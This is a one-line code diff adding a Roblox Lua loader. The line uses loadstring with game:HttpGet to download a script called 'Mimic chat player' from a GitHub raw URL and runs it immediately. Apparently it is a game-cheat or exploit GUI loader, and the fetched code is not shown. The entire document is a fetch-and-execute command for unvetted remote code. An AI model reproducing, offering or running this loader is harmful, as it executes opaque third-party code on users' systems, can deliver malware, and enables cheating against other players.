@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entechicken24/SCRIPT-GUI/refs/heads/main/Mimic%20chat%20player"))()
